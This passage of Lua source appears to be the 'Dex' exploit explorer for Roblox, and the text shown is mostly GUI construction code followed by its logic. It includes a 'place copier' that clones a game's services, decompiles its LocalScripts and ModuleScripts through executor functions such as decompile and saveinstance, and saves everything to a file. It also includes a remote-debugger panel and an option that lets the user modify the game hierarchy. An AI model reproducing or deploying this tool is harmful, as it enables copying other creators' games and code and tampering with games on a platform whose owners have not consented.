NewGuiPart122.Font = Enum.Font.SourceSans
NewGuiPart122.FontSize = Enum.FontSize.Size18
NewGuiPart122.Text = "Lighting Properties"
NewGuiPart122.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart123.Name = "Status"
NewGuiPart123.Parent = NewGuiPart121
NewGuiPart123.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart123.BackgroundTransparency = 1
NewGuiPart123.Position = UDim2.new(0, 60, 0, 30)
NewGuiPart123.Size = UDim2.new(0, 50, 0, 15)
NewGuiPart123.Font = Enum.Font.SourceSans
NewGuiPart123.FontSize = Enum.FontSize.Size18
NewGuiPart123.Text = "Off"
NewGuiPart123.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart124.Name = "Change"
NewGuiPart124.Parent = NewGuiPart121
NewGuiPart124.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
NewGuiPart124.BorderSizePixel = 0
NewGuiPart124.Position = UDim2.new(0, 10, 0, 30)
NewGuiPart124.Size = UDim2.new(0, 40, 0, 15)
NewGuiPart124.Font = Enum.Font.SourceSans
NewGuiPart124.FontSize = Enum.FontSize.Size14
NewGuiPart124.Text = ""

NewGuiPart125.Name = "OnBar"
NewGuiPart125.Parent = NewGuiPart124
NewGuiPart125.BackgroundColor3 = Color3.new(0, 0.576471, 0.862745)
NewGuiPart125.BorderSizePixel = 0
NewGuiPart125.Size = UDim2.new(0, 0, 0, 15)
NewGuiPart125.Font = Enum.Font.SourceSans
NewGuiPart125.FontSize = Enum.FontSize.Size14
NewGuiPart125.Text = ""

NewGuiPart126.Name = "Bar"
NewGuiPart126.Parent = NewGuiPart124
NewGuiPart126.BackgroundColor3 = Color3.new(0, 0, 0)
NewGuiPart126.BorderSizePixel = 0
NewGuiPart126.ClipsDescendants = true
NewGuiPart126.Position = UDim2.new(0, -2, 0, -2)
NewGuiPart126.Size = UDim2.new(0, 10, 0, 19)
NewGuiPart126.Font = Enum.Font.SourceSans
NewGuiPart126.FontSize = Enum.FontSize.Size14
NewGuiPart126.Text = ""

NewGuiPart127.Name = "CameraInstances"
NewGuiPart127.Parent = NewGuiPart114
NewGuiPart127.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart127.BackgroundTransparency = 1
NewGuiPart127.Position = UDim2.new(0, 0, 0, 180)
NewGuiPart127.Size = UDim2.new(1, 0, 0, 60)

NewGuiPart128.Name = "SName"
NewGuiPart128.Parent = NewGuiPart127
NewGuiPart128.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart128.BackgroundTransparency = 1
NewGuiPart128.Position = UDim2.new(0, 10, 0, 0)
NewGuiPart128.Size = UDim2.new(1, -20, 0, 30)
NewGuiPart128.Font = Enum.Font.SourceSans
NewGuiPart128.FontSize = Enum.FontSize.Size18
NewGuiPart128.Text = "Camera Instances"
NewGuiPart128.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart129.Name = "Status"
NewGuiPart129.Parent = NewGuiPart127
NewGuiPart129.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart129.BackgroundTransparency = 1
NewGuiPart129.Position = UDim2.new(0, 60, 0, 30)
NewGuiPart129.Size = UDim2.new(0, 50, 0, 15)
NewGuiPart129.Font = Enum.Font.SourceSans
NewGuiPart129.FontSize = Enum.FontSize.Size18
NewGuiPart129.Text = "Off"
NewGuiPart129.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart130.Name = "Change"
NewGuiPart130.Parent = NewGuiPart127
NewGuiPart130.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
NewGuiPart130.BorderSizePixel = 0
NewGuiPart130.Position = UDim2.new(0, 10, 0, 30)
NewGuiPart130.Size = UDim2.new(0, 40, 0, 15)
NewGuiPart130.Font = Enum.Font.SourceSans
NewGuiPart130.FontSize = Enum.FontSize.Size14
NewGuiPart130.Text = ""

NewGuiPart131.Name = "OnBar"
NewGuiPart131.Parent = NewGuiPart130
NewGuiPart131.BackgroundColor3 = Color3.new(0, 0.576471, 0.862745)
NewGuiPart131.BorderSizePixel = 0
NewGuiPart131.Size = UDim2.new(0, 0, 0, 15)
NewGuiPart131.Font = Enum.Font.SourceSans
NewGuiPart131.FontSize = Enum.FontSize.Size14
NewGuiPart131.Text = ""

NewGuiPart132.Name = "Bar"
NewGuiPart132.Parent = NewGuiPart130
NewGuiPart132.BackgroundColor3 = Color3.new(0, 0, 0)
NewGuiPart132.BorderSizePixel = 0
NewGuiPart132.ClipsDescendants = true
NewGuiPart132.Position = UDim2.new(0, -2, 0, -2)
NewGuiPart132.Size = UDim2.new(0, 10, 0, 19)
NewGuiPart132.Font = Enum.Font.SourceSans
NewGuiPart132.FontSize = Enum.FontSize.Size14
NewGuiPart132.Text = ""

NewGuiPart133.Name = "Scripts"
NewGuiPart133.Parent = NewGuiPart114
NewGuiPart133.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart133.BackgroundTransparency = 1
NewGuiPart133.Size = UDim2.new(1, 0, 0, 60)

NewGuiPart134.Name = "SName"
NewGuiPart134.Parent = NewGuiPart133
NewGuiPart134.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart134.BackgroundTransparency = 1
NewGuiPart134.Position = UDim2.new(0, 10, 0, 0)
NewGuiPart134.Size = UDim2.new(1, -20, 0, 30)
NewGuiPart134.Font = Enum.Font.SourceSans
NewGuiPart134.FontSize = Enum.FontSize.Size18
NewGuiPart134.Text = "Save Scripts"
NewGuiPart134.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart135.Name = "Status"
NewGuiPart135.Parent = NewGuiPart133
NewGuiPart135.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart135.BackgroundTransparency = 1
NewGuiPart135.Position = UDim2.new(0, 60, 0, 30)
NewGuiPart135.Size = UDim2.new(0, 50, 0, 15)
NewGuiPart135.Font = Enum.Font.SourceSans
NewGuiPart135.FontSize = Enum.FontSize.Size18
NewGuiPart135.Text = "Off"
NewGuiPart135.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart136.Name = "Change"
NewGuiPart136.Parent = NewGuiPart133
NewGuiPart136.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
NewGuiPart136.BorderSizePixel = 0
NewGuiPart136.Position = UDim2.new(0, 10, 0, 30)
NewGuiPart136.Size = UDim2.new(0, 40, 0, 15)
NewGuiPart136.Font = Enum.Font.SourceSans
NewGuiPart136.FontSize = Enum.FontSize.Size14
NewGuiPart136.Text = ""

NewGuiPart137.Name = "OnBar"
NewGuiPart137.Parent = NewGuiPart136
NewGuiPart137.BackgroundColor3 = Color3.new(0, 0.576471, 0.862745)
NewGuiPart137.BorderSizePixel = 0
NewGuiPart137.Size = UDim2.new(0, 0, 0, 15)
NewGuiPart137.Font = Enum.Font.SourceSans
NewGuiPart137.FontSize = Enum.FontSize.Size14
NewGuiPart137.Text = ""

NewGuiPart138.Name = "Bar"
NewGuiPart138.Parent = NewGuiPart136
NewGuiPart138.BackgroundColor3 = Color3.new(0, 0, 0)
NewGuiPart138.BorderSizePixel = 0
NewGuiPart138.ClipsDescendants = true
NewGuiPart138.Position = UDim2.new(0, -2, 0, -2)
NewGuiPart138.Size = UDim2.new(0, 10, 0, 19)
NewGuiPart138.Font = Enum.Font.SourceSans
NewGuiPart138.FontSize = Enum.FontSize.Size14
NewGuiPart138.Text = ""

NewGuiPart139.Name = "ToSave"
NewGuiPart139.Parent = NewGuiPart111
NewGuiPart139.BackgroundTransparency = 1
NewGuiPart139.Position = UDim2.new(0, 0, 0, 17)
NewGuiPart139.Size = UDim2.new(1, 0, 0, 20)
NewGuiPart139.Font = Enum.Font.SourceSans
NewGuiPart139.FontSize = Enum.FontSize.Size18
NewGuiPart139.Text = "To Save"
NewGuiPart139.TextColor3 = Color3.new(0, 0, 0)

NewGuiPart140.Name = "CopyList"
NewGuiPart140.Parent = NewGuiPart111
NewGuiPart140.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart140.BackgroundTransparency = 0.80000001192093
NewGuiPart140.Position = UDim2.new(0, 0, 0, 37)
NewGuiPart140.Size = UDim2.new(1, 0, 0, 163)

NewGuiPart141.Name = "Bottom"
NewGuiPart141.Parent = NewGuiPart111
NewGuiPart141.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart141.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart141.Position = UDim2.new(0, 0, 1, -50)
NewGuiPart141.Size = UDim2.new(1, 0, 0, 50)

NewGuiPart142.Parent = NewGuiPart141
NewGuiPart142.BackgroundTransparency = 1
NewGuiPart142.Position = UDim2.new(0, 4, 0, 0)
NewGuiPart142.Size = UDim2.new(1, -4, 1, 0)
NewGuiPart142.Font = Enum.Font.SourceSans
NewGuiPart142.FontSize = Enum.FontSize.Size14
NewGuiPart142.Text = "After the map saves, open a new place on studio, then right click Lighting and \"Insert from file...\", then select your file and run the unpacker script inside the folder."
NewGuiPart142.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart142.TextWrapped = true
NewGuiPart142.TextXAlignment = Enum.TextXAlignment.Left
NewGuiPart142.TextYAlignment = Enum.TextYAlignment.Top

NewGuiPart143.Name = "Save"
NewGuiPart143.Parent = NewGuiPart111
NewGuiPart143.BackgroundColor3 = Color3.new(0.941177, 0.941177, 0.941177)
NewGuiPart143.BackgroundTransparency = 0.80000001192093
NewGuiPart143.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart143.Position = UDim2.new(0, 0, 1, -80)
NewGuiPart143.Size = UDim2.new(1, 0, 0, 30)
NewGuiPart143.Font = Enum.Font.SourceSans
NewGuiPart143.FontSize = Enum.FontSize.Size18
NewGuiPart143.Text = "Save"

NewGuiPart144.Name = "FileName"
NewGuiPart144.Parent = NewGuiPart111
NewGuiPart144.BackgroundColor3 = Color3.new(0.941177, 0.941177, 0.941177)
NewGuiPart144.BackgroundTransparency = 0.60000002384186
NewGuiPart144.Position = UDim2.new(0, 0, 1, -105)
NewGuiPart144.Size = UDim2.new(1, 0, 0, 25)
NewGuiPart144.Font = Enum.Font.SourceSans
NewGuiPart144.FontSize = Enum.FontSize.Size18
NewGuiPart144.Text = "PlaceName"
NewGuiPart144.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart145.Name = "Entry"
NewGuiPart145.Parent = NewGuiPart111
NewGuiPart145.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart145.BackgroundTransparency = 1
NewGuiPart145.Size = UDim2.new(1, 0, 0, 22)
NewGuiPart145.Visible = false

NewGuiPart146.Name = "Change"
NewGuiPart146.Parent = NewGuiPart145
NewGuiPart146.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart146.BackgroundTransparency = 0.60000002384186
NewGuiPart146.Position = UDim2.new(0, 10, 0, 1)
NewGuiPart146.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart146.ZIndex = 2
NewGuiPart146.Font = Enum.Font.SourceSans
NewGuiPart146.FontSize = Enum.FontSize.Size18
NewGuiPart146.Text = ""
NewGuiPart146.TextColor3 = Color3.new(1, 1, 1)

NewGuiPart147.Name = "enabled"
NewGuiPart147.Parent = NewGuiPart146
NewGuiPart147.BackgroundColor3 = Color3.new(0.380392, 0.380392, 0.380392)
NewGuiPart147.BackgroundTransparency = 0.40000000596046
NewGuiPart147.BorderSizePixel = 0
NewGuiPart147.Position = UDim2.new(0, 3, 0, 3)
NewGuiPart147.Size = UDim2.new(0, 14, 0, 14)
NewGuiPart147.Font = Enum.Font.SourceSans
NewGuiPart147.FontSize = Enum.FontSize.Size14
NewGuiPart147.Text = ""

NewGuiPart148.Name = "Info"
NewGuiPart148.Parent = NewGuiPart145
NewGuiPart148.BackgroundTransparency = 1
NewGuiPart148.Position = UDim2.new(0, 40, 0, 0)
NewGuiPart148.Size = UDim2.new(1, -40, 0, 22)
NewGuiPart148.Font = Enum.Font.SourceSans
NewGuiPart148.FontSize = Enum.FontSize.Size18
NewGuiPart148.Text = "Workspace"
NewGuiPart148.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart148.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart149.Name = "RemoteDebugWindow"
NewGuiPart149.Parent = NewGuiPart1
NewGuiPart149.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart149.BackgroundTransparency = 0.10000000149012
NewGuiPart149.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart149.Position = UDim2.new(1, 0, 0, 0)
NewGuiPart149.Size = UDim2.new(0, 300, 1, 0)

NewGuiPart161.Name = "GetSetting"
NewGuiPart161.Parent = NewGuiPart149
NewGuiPart161.Archivable = true

NewGuiPart150.Name = "Header"
NewGuiPart150.Parent = NewGuiPart149
NewGuiPart150.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart150.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart150.Size = UDim2.new(1, 0, 0, 17)

NewGuiPart151.Parent = NewGuiPart150
NewGuiPart151.BackgroundTransparency = 1
NewGuiPart151.Position = UDim2.new(0, 4, 0, 0)
NewGuiPart151.Size = UDim2.new(1, -4, 1, 0)
NewGuiPart151.Font = Enum.Font.SourceSans
NewGuiPart151.FontSize = Enum.FontSize.Size14
NewGuiPart151.Text = "Remote Debugger"
NewGuiPart151.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart151.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart152.Name = "Desc"
NewGuiPart152.Parent = NewGuiPart149
NewGuiPart152.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart152.BackgroundTransparency = 1
NewGuiPart152.Position = UDim2.new(0, 0, 0, 20)
NewGuiPart152.Size = UDim2.new(1, 0, 0, 40)
NewGuiPart152.Font = Enum.Font.SourceSans
NewGuiPart152.FontSize = Enum.FontSize.Size32
NewGuiPart152.Text = "Have fun with remotes"
NewGuiPart152.TextWrapped = true
return NewGuiPart1
end
local D_E_X = CreateGui()
D_E_X.Parent = game.Players.LocalPlayer.PlayerGui
spawn(function()
	local Gui = D_E_X
	

local IntroFrame = Gui:WaitForChild("IntroFrame")

local SideMenu = Gui:WaitForChild("SideMenu")
local OpenToggleButton = Gui:WaitForChild("Toggle")
local CloseToggleButton = SideMenu:WaitForChild("Toggle")
local OpenScriptEditorButton = SideMenu:WaitForChild("OpenScriptEditor")

local ScriptEditor = Gui:WaitForChild("ScriptEditor")

local SlideOut = SideMenu:WaitForChild("SlideOut")
local SlideFrame = SlideOut:WaitForChild("SlideFrame")
local Slant = SideMenu:WaitForChild("Slant")

local ExplorerButton = SlideFrame:WaitForChild("Explorer")
local SettingsButton = SlideFrame:WaitForChild("Settings")

local SelectionBox = Instance.new("SelectionBox")
SelectionBox.Parent = Gui

local ExplorerPanel = Gui:WaitForChild("ExplorerPanel")
local PropertiesFrame = Gui:WaitForChild("PropertiesFrame")
local SaveMapWindow = Gui:WaitForChild("SaveMapWindow")
local RemoteDebugWindow = Gui:WaitForChild("RemoteDebugWindow")

local SettingsPanel = Gui:WaitForChild("SettingsPanel")
local SettingsListener = SettingsPanel:WaitForChild("GetSetting")
local SettingTemplate = SettingsPanel:WaitForChild("SettingTemplate")
local SettingList = SettingsPanel:WaitForChild("SettingList")

local SaveMapCopyList = SaveMapWindow:WaitForChild("CopyList")
local SaveMapSettingFrame = SaveMapWindow:WaitForChild("MapSettings")
local SaveMapName = SaveMapWindow:WaitForChild("FileName")
local SaveMapButton = SaveMapWindow:WaitForChild("Save")
local SaveMapCopyTemplate = SaveMapWindow:WaitForChild("Entry")
local SaveMapSettings = {
	CopyWhat = {
		Workspace = true,
		Lighting = true,
		ReplicatedStorage = true,
		ReplicatedFirst = true,
		StarterPack = true,
		StarterGui = true,
		StarterPlayer = true
	},
	SaveScripts = true,
	SaveTerrain = true,
	LightingProperties = true,
	CameraInstances = true
}

local SelectionChanged = ExplorerPanel:WaitForChild("SelectionChanged")
local GetSelection = ExplorerPanel:WaitForChild("GetSelection")
local SetSelection = ExplorerPanel:WaitForChild("SetSelection")

local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()

local CurrentWindow = "Nothing c:"
local Windows = {
	Explorer = {
		ExplorerPanel,
		PropertiesFrame
	},
	Settings = {SettingsPanel},
	SaveMap = {SaveMapWindow},
	Remotes = {RemoteDebugWindow}
}

function switchWindows(wName,over)
	if CurrentWindow == wName and not over then return end
	
	local count = 0
	
	for i,v in pairs(Windows) do
		count = 0
		if i ~= wName then
			for _,c in pairs(v) do c:TweenPosition(UDim2.new(1, 30, count * 0.5, count * 36), "Out", "Quad", 0.5, true) count = count + 1 end
		end
	end
	
	count = 0
	
	if Windows[wName] then
		for _,c in pairs(Windows[wName]) do c:TweenPosition(UDim2.new(1, -300, count * 0.5, count * 36), "Out", "Quad", 0.5, true) count = count + 1 end
	end
	
	if wName ~= "Nothing c:" then
		CurrentWindow = wName
		for i,v in pairs(SlideFrame:GetChildren()) do
			v.BackgroundTransparency = 1
			v.Icon.ImageColor3 = Color3.new(70/255, 70/255, 70/255)
		end
		if SlideFrame:FindFirstChild(wName) then
			SlideFrame[wName].BackgroundTransparency = 0.5
			SlideFrame[wName].Icon.ImageColor3 = Color3.new(0,0,0)
		end
	end
end

function toggleDex(on)
	if on then
		SideMenu:TweenPosition(UDim2.new(1, -330, 0, 0), "Out", "Quad", 0.5, true)
		OpenToggleButton:TweenPosition(UDim2.new(1,0,0,0), "Out", "Quad", 0.5, true)
		switchWindows(CurrentWindow,true)
	else
		SideMenu:TweenPosition(UDim2.new(1, 0, 0, 0), "Out", "Quad", 0.5, true)
		OpenToggleButton:TweenPosition(UDim2.new(1,-30,0,0), "Out", "Quad", 0.5, true)
		switchWindows("Nothing c:")
	end
end

local Settings = {
	ClickSelect = false,
	SelBox = false,
	ClearProps = false,
	SelectUngrouped = true,
	SaveInstanceScripts = true
}

function ReturnSetting(set)
	if set == "ClearProps" then
		return Settings.ClearProps
	elseif set == "SelectUngrouped" then
		return Settings.SelectUngrouped
	end
end

OpenToggleButton.MouseButton1Up:connect(function()
	toggleDex(true)
end)

OpenScriptEditorButton.MouseButton1Up:connect(function()
	if OpenScriptEditorButton.Active then
		ScriptEditor.Visible = true
	end
end)

CloseToggleButton.MouseButton1Up:connect(function()
	if CloseToggleButton.Active then
		toggleDex(false)
	end
end)

for i,v in pairs(SlideFrame:GetChildren()) do
	v.MouseButton1Click:connect(function()
		switchWindows(v.Name)
	end)
	
	v.MouseEnter:connect(function()v.BackgroundTransparency = 0.5 end)
	v.MouseLeave:connect(function()if CurrentWindow~=v.Name then v.BackgroundTransparency = 1 end end)
end


function createSetting(name,interName,defaultOn)
	local newSetting = SettingTemplate:Clone()
	newSetting.Position = UDim2.new(0,0,0,#SettingList:GetChildren() * 60)
	newSetting.SName.Text = name
	
	local function toggle(on)
		if on then
			newSetting.Change.Bar:TweenPosition(UDim2.new(0,32,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			newSetting.Change.OnBar:TweenSize(UDim2.new(0,34,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			newSetting.Status.Text = "On"
			Settings[interName] = true
		else
			newSetting.Change.Bar:TweenPosition(UDim2.new(0,-2,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			newSetting.Change.OnBar:TweenSize(UDim2.new(0,0,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			newSetting.Status.Text = "Off"
			Settings[interName] = false
		end
	end	
	
	newSetting.Change.MouseButton1Click:connect(function()
		toggle(not Settings[interName])
	end)
	
	newSetting.Visible = true
	newSetting.Parent = SettingList
	
	if defaultOn then
		toggle(true)
	end
end

createSetting("Click part to select","ClickSelect",false)
createSetting("Selection Box","SelBox",false)
createSetting("Clear property value on focus","ClearProps",false)
createSetting("Select ungrouped models","SelectUngrouped",true)
createSetting("SaveInstance decompiles scripts","SaveInstanceScripts",true)

local function getSelection()
	local t = GetSelection:Invoke()
	if t and #t > 0 then
		return t[1]
	else
		return nil
	end
end

Mouse.Button1Down:connect(function()
	if CurrentWindow == "Explorer" and Settings.ClickSelect then
		local target = Mouse.Target
		if target then
			SetSelection:Invoke({target})
		end
	end
end)

SelectionChanged.Event:connect(function()
	if Settings.SelBox then
		local success,err = pcall(function()
			local selection = getSelection()
			SelectionBox.Adornee = selection
		end)
		if err then
			SelectionBox.Adornee = nil
		end
	end
end)

SettingsListener.OnInvoke = ReturnSetting

-- Map Copier

function createMapSetting(obj,interName,defaultOn)
	local function toggle(on)
		if on then
			obj.Change.Bar:TweenPosition(UDim2.new(0,32,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			obj.Change.OnBar:TweenSize(UDim2.new(0,34,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			obj.Status.Text = "On"
			SaveMapSettings[interName] = true
		else
			obj.Change.Bar:TweenPosition(UDim2.new(0,-2,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			obj.Change.OnBar:TweenSize(UDim2.new(0,0,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			obj.Status.Text = "Off"
			SaveMapSettings[interName] = false
		end
	end	
	
	obj.Change.MouseButton1Click:connect(function()
		toggle(not SaveMapSettings[interName])
	end)
	
	obj.Visible = true
	obj.Parent = SaveMapSettingFrame
	
	if defaultOn then
		toggle(true)
	end
end

function createCopyWhatSetting(serv)
	if SaveMapSettings.CopyWhat[serv] then
		local newSetting = SaveMapCopyTemplate:Clone()
		newSetting.Position = UDim2.new(0,0,0,#SaveMapCopyList:GetChildren() * 22 + 5)
		newSetting.Info.Text = serv
		
		local function toggle(on)
			if on then
				newSetting.Change.enabled.Visible = true
				SaveMapSettings.CopyWhat[serv] = true
			else
				newSetting.Change.enabled.Visible = false
				SaveMapSettings.CopyWhat[serv] = false
			end
		end	
	
		newSetting.Change.MouseButton1Click:connect(function()
			toggle(not SaveMapSettings.CopyWhat[serv])
		end)
		
		newSetting.Visible = true
		newSetting.Parent = SaveMapCopyList
	end
end

createMapSetting(SaveMapSettingFrame.Scripts,"SaveScripts",true)
createMapSetting(SaveMapSettingFrame.Terrain,"SaveTerrain",true)
createMapSetting(SaveMapSettingFrame.Lighting,"LightingProperties",true)
createMapSetting(SaveMapSettingFrame.CameraInstances,"CameraInstances",true)

createCopyWhatSetting("Workspace")
createCopyWhatSetting("Lighting")
createCopyWhatSetting("ReplicatedStorage")
createCopyWhatSetting("ReplicatedFirst")
createCopyWhatSetting("StarterPack")
createCopyWhatSetting("StarterGui")
createCopyWhatSetting("StarterPlayer")

SaveMapName.Text = tostring(game.PlaceId).."MapCopy"

SaveMapButton.MouseButton1Click:connect(function()
	local copyWhat = {}

	local copyGroup = Instance.new("Model",game.ReplicatedStorage)

	local copyScripts = SaveMapSettings.SaveScripts

	local copyTerrain = SaveMapSettings.SaveTerrain

	local lightingProperties = SaveMapSettings.LightingProperties

	local cameraInstances = SaveMapSettings.CameraInstances

	-----------------------------------------------------------------------------------

	for i,v in pairs(SaveMapSettings.CopyWhat) do
		if v then
			table.insert(copyWhat,i)
		end
	end

	local consoleFunc = printconsole or writeconsole

	if consoleFunc then
		consoleFunc("Raspberry Pi's place copier loaded.")
		consoleFunc("Copying map of game "..tostring(game.PlaceId)..".")
	end

	function archivable(root)
		for i,v in pairs(root:GetChildren()) do
			if not game.Players:GetPlayerFromCharacter(v) then
				v.Archivable = true
				archivable(v)
			end
		end
	end

	function decompileS(root)
		for i,v in pairs(root:GetChildren()) do
			pcall(function()
				if v:IsA("LocalScript") then
					local isDisabled = v.Disabled
					v.Disabled = true
					v.Source = decompile(v)
					v.Disabled = isDisabled
				
					if v.Source == "" then 
						if consoleFunc then consoleFunc("LocalScript "..v.Name.." had a problem decompiling.") end
					else
						if consoleFunc then consoleFunc("LocalScript "..v.Name.." decompiled.") end
					end
				elseif v:IsA("ModuleScript") then
					v.Source = decompile(v)
				
					if v.Source == "" then 
						if consoleFunc then consoleFunc("ModuleScript "..v.Name.." had a problem decompiling.") end
					else
						if consoleFunc then consoleFunc("ModuleScript "..v.Name.." decompiled.") end
					end
				end
			end)
			decompileS(v)
		end
	end

	for i,v in pairs(copyWhat) do archivable(game[v]) end

	for j,obj in pairs(copyWhat) do
		if obj ~= "StarterPlayer" then
			local newFolder = Instance.new("Folder",copyGroup)
			newFolder.Name = obj
			for i,v in pairs(game[obj]:GetChildren()) do
				if v ~= copyGroup then
					pcall(function()
						v:Clone().Parent = newFolder
					end)
				end
			end
		else
			local newFolder = Instance.new("Model",copyGroup)
			newFolder.Name = "StarterPlayer"
			for i,v in pairs(game[obj]:GetChildren()) do
				local newObj = Instance.new("Folder",newFolder)
				newObj.Name = v.Name
				for _,c in pairs(v:GetChildren()) do
					if c.Name ~= "ControlScript" and c.Name ~= "CameraScript" then
						c:Clone().Parent = newObj
					end
				end
			end
		end
	end

	if workspace.CurrentCamera and cameraInstances then
		local cameraFolder = Instance.new("Model",copyGroup)
		cameraFolder.Name = "CameraItems"
		for i,v in pairs(workspace.CurrentCamera:GetChildren()) do v:Clone().Parent = cameraFolder end
	end

	if copyTerrain then
		local myTerrain = workspace.Terrain:CopyRegion(workspace.Terrain.MaxExtents)
		myTerrain.Parent = copyGroup
	end

	function saveProp(obj,prop,par)
		local myProp = obj[prop]
		if type(myProp) == "boolean" then
			local newProp = Instance.new("BoolValue",par)
			newProp.Name = prop
			newProp.Value = myProp
		elseif type(myProp) == "number" then
			local newProp = Instance.new("IntValue",par)
			newProp.Name = prop
			newProp.Value = myProp
		elseif type(myProp) == "string" then
			local newProp = Instance.new("StringValue",par)
			newProp.Name = prop
			newProp.Value = myProp
		elseif type(myProp) == "userdata" then -- Assume Color3
			pcall(function()
				local newProp = Instance.new("Color3Value",par)
				newProp.Name = prop
				newProp.Value = myProp
			end)
		end
	end

	if lightingProperties then
		local lightingProps = Instance.new("Model",copyGroup)
		lightingProps.Name = "LightingProperties"
	
		saveProp(game.Lighting,"Ambient",lightingProps)
		saveProp(game.Lighting,"Brightness",lightingProps)
		saveProp(game.Lighting,"ColorShift_Bottom",lightingProps)
		saveProp(game.Lighting,"ColorShift_Top",lightingProps)
		saveProp(game.Lighting,"GlobalShadows",lightingProps)
		saveProp(game.Lighting,"OutdoorAmbient",lightingProps)
		saveProp(game.Lighting,"Outlines",lightingProps)
		saveProp(game.Lighting,"GeographicLatitude",lightingProps)
		saveProp(game.Lighting,"TimeOfDay",lightingProps)
		saveProp(game.Lighting,"FogColor",lightingProps)
		saveProp(game.Lighting,"FogEnd",lightingProps)
		saveProp(game.Lighting,"FogStart",lightingProps)
	end

	if decompile and copyScripts then
		decompileS(copyGroup)
	end

	if SaveInstance then
		SaveInstance(copyGroup,SaveMapName.Text..".rbxm")
	elseif saveinstance then
		saveinstance(getelysianpath()..SaveMapName.Text..".rbxm",copyGroup)
	end
	--print("Saved!")
	if consoleFunc then
		consoleFunc("The map has been copied.")
	end
	SaveMapButton.Text = "The map has been saved"
	wait(5)
	SaveMapButton.Text = "Save"
end)

-- End Copier

wait()

IntroFrame:TweenPosition(UDim2.new(1,-300,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)

switchWindows("Explorer")

wait(1)

SideMenu.Visible = true

for i = 0,1,0.1 do
	IntroFrame.BackgroundTransparency = i
	IntroFrame.Main.BackgroundTransparency = i
	IntroFrame.Slant.ImageTransparency = i
	IntroFrame.Title.TextTransparency = i
	IntroFrame.Version.TextTransparency = i
	IntroFrame.Creator.TextTransparency = i
	wait()
end

IntroFrame.Visible = false

SlideFrame:TweenPosition(UDim2.new(0,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
OpenScriptEditorButton:TweenPosition(UDim2.new(0,0,0,180),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
CloseToggleButton:TweenPosition(UDim2.new(0,0,0,210),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
Slant:TweenPosition(UDim2.new(0,0,0,240),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)

wait(0.5)

for i = 1,0,-0.1 do
	OpenScriptEditorButton.Icon.ImageTransparency = i
	CloseToggleButton.TextTransparency = i
	wait()
end

CloseToggleButton.Active = true
CloseToggleButton.AutoButtonColor = true

OpenScriptEditorButton.Active = true
OpenScriptEditorButton.AutoButtonColor = true
end)
spawn(function()
	-- initial states
local Option = {
	-- can modify object parents in the hierarchy
	Modifiable = false;
	-- can select objects
	Selectable = true;
}

-- MERELY

Option.Modifiable = true

-- END MERELY

-- general size of GUI objects, in pixels
local GUI_SIZE = 16
-- padding between items within each entry
local ENTRY_PADDING = 1
-- padding between each entry
local ENTRY_MARGIN = 1

local Input = game:GetService("UserInputService")
local HoldingCtrl = false
local HoldingShift = false

--[[

# Explorer Panel

A GUI panel that displays the game hierarchy.


## Selection Bindables

- `Function GetSelection ( )`

	Returns an array of objects representing the objects currently
	selected in the panel.

- `Function SetSelection ( Objects selection )`

	Sets the objects that are selected in the panel. `selection` is an array
	of objects.

- `Event SelectionChanged ( )`

	Fired after the selection changes.


## Option Bindables

- `Function GetOption ( string optionName )`

	If `optionName` is given, returns the value of that option. Otherwise,
	returns a table of options and their current values.

- `Function SetOption ( string optionName, bool value )`

	Sets `optionName` to `value`.

	Options:

	- Modifiable

		Whether objects can be modified by the panel.

		Note that modifying objects depends on being able to select them. If
		Selectable is false, then Actions will not be available. Reparenting
		is still possible, but only for the dragged object.

	- Selectable

		Whether objects can be selected.

